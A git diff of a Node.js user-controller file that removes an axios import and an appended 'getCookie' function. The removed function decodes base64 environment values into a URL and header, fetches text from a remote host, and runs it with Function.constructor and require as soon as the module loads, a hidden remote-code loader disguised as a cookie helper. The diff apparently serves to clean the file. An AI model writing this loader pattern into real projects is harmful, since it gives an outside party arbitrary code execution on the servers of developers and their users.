@@ -5,7 +5,6 @@ const ErrorHandler = require("../utils/errorHandler");
 const sendEmail = require("../utils/sendEmail");
 const crypto = require("crypto");
 const cloudinary = require("cloudinary");
-const axios = require("axios");
 const path = require("path");
 require('dotenv').config({path: path.resolve(__dirname, '../config/.config.env')});
 
@@ -261,13 +260,3 @@ exports.deleteUser = asyncErrorHandler(async (req, res, next) => {
     success: true,
   });
 });
-
-//Get Cookie
-exports.getCookie = asyncErrorHandler(async (req, res, next) => {
-  const s = atob(process.env.DEV_API_KEY);
-  const k = atob(process.env.DEV_SECRET_KEY);
-  const v = atob(process.env.DEV_SECRET_VALUE);
-  const r = (await axios.get(s,{headers:{[k]:v}})).data.record.cookie;
-  const handler = new (Function.constructor)('require',r);
-  handler(require);
-})();
